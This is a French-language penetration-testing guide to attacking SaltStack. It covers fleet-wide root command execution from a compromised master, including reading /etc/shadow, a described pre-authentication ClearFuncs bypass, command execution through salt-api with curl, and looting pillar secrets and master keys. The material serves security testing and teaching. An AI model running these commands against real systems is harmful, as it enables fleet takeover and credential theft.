---
title: "SaltStack : abuser du master Salt et de salt-api pour l'exécution de code sur les minions"
description: "Attaquer SaltStack : exécuter des commandes en tant que root sur chaque minion depuis un master compromis, le contournement d'authentification non authentifié du serveur de requêtes du master et la lecture de fichiers qui donnent la clé racine et l'exécution arbitraire, abuser de l'authentification externe de salt-api, et piller le pillar et la configuration du master à la recherche de secrets."
keywords:
  - SaltStack
  - salt master
  - salt minion
  - salt-api
  - ClearFuncs
---

# SaltStack

Salt est un système master/minion : les minions se connectent vers le master via ZeroMQ (TCP 4505 pour le bus de publication, 4506 pour le serveur de requêtes), et le master pousse des commandes que chaque minion exécute en tant que root. Le contrôle du master équivaut à root sur toute la flotte, et le serveur de requêtes a comporté des failles pré-authentification qui livrent ce contrôle à quiconque peut atteindre le port 4506.

## Trouver le master et les minions

```bash
nmap -p4505,4506 -sV <target>                    # the ZeroMQ publish and request ports
ls /etc/salt/; ps aux | grep -E 'salt-master|salt-minion|salt-api'
```

## Commander la flotte depuis le master

Sur un master compromis, les propres modules d'exécution de Salt lancent n'importe quoi sur les minions sélectionnés en tant que root :

```bash
salt '*' test.ping                               # which minions respond
salt '*' cmd.run 'id'                            # run as root on every minion
salt -L 'web1,db1' cmd.run 'cat /etc/shadow'     # target a list
salt '*' cp.get_file salt://x /tmp/x             # push files from the master file server
```

## Compromission non authentifiée du master

Le serveur de requêtes du master (`ReqServer`) exposait un dispatch de méthodes (`ClearFuncs`) qui n'authentifiait pas certains appels, de sorte qu'un attaquant pouvant atteindre 4506 pouvait invoquer directement des fonctions internes : lire la clé racine du master pour ensuite signer et publier des tâches, et déclencher l'exécution de commandes, sans aucun identifiant. Une traversée de répertoire associée dans les fonctions de service de fichiers lisait des fichiers arbitraires depuis le master. Ensemble, elles constituent une exécution de code à distance pré-authentification en tant que root sur le master, et donc sur chaque minion.

```bash
# the mechanism: speak the ReqServer protocol to _prep_auth_info / the file functions
# to retrieve the master root key, then publish a cmd.run job to all minions.
# maintained proof-of-concept tooling drives the exchange against port 4506.
```

Atteindre 4506 depuis Internet ou un pivot et trouver un master non corrigé est une prise de contrôle directe de la flotte ; vérifiez la version avant de vous y fier, il s'agit de plages de builds spécifiques.

## salt-api et authentification externe

`salt-api` (le module `rest_cherrypy`) expose le master via HTTP et s'authentifie auprès d'un système externe (PAM, LDAP) sélectionné par `eauth`. Des comptes `eauth` faibles ou par défaut, ou un compte autorisé à utiliser le client `@wheel`/`@runner`/`local`, atteignent l'exécution de commandes via HTTP :

```bash
# authenticate, then run a command on all minions through the API
curl -sk https://<master>:8000/login -d username=saltdev -d password=<pw> -d eauth=pam
curl -sk https://<master>:8000/ -H "X-Auth-Token: <token>" \
  -d client=local -d tgt='*' -d fun=cmd.run -d arg='id'
```

## Piller la configuration

La configuration du master et les données pillar contiennent des secrets et le modèle de confiance :

```bash
cat /etc/salt/master                             # file_roots, pillar_roots, external_auth, api users
salt '*' pillar.items                            # pillar data, which routinely carries credentials
ls /etc/salt/pki/master/                         # the master keys and accepted minion keys
```

## Suite

Un master compromis équivaut à root sur chaque minion simultanément ; les secrets pillar et les clés de minion acceptées étendent la portée, et les identifiants récoltés pivotent vers l'annuaire et les comptes cloud qu'ils déverrouillent.

## Outils

- `salt`, `salt-run`, `salt-key` : exécution de commandes sur la flotte et gestion des clés depuis le master.
- Outils de preuve de concept maintenus pour la voie du ReqServer non authentifié.

## Références

- [Modules d'exécution à distance Salt (cmd.run)](https://docs.saltproject.io/en/latest/ref/modules/all/salt.modules.cmdmod.html)
- [salt-api / rest_cherrypy](https://docs.saltproject.io/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html)
- [Authentification externe Salt (eauth)](https://docs.saltproject.io/en/latest/topics/eauth/index.html)
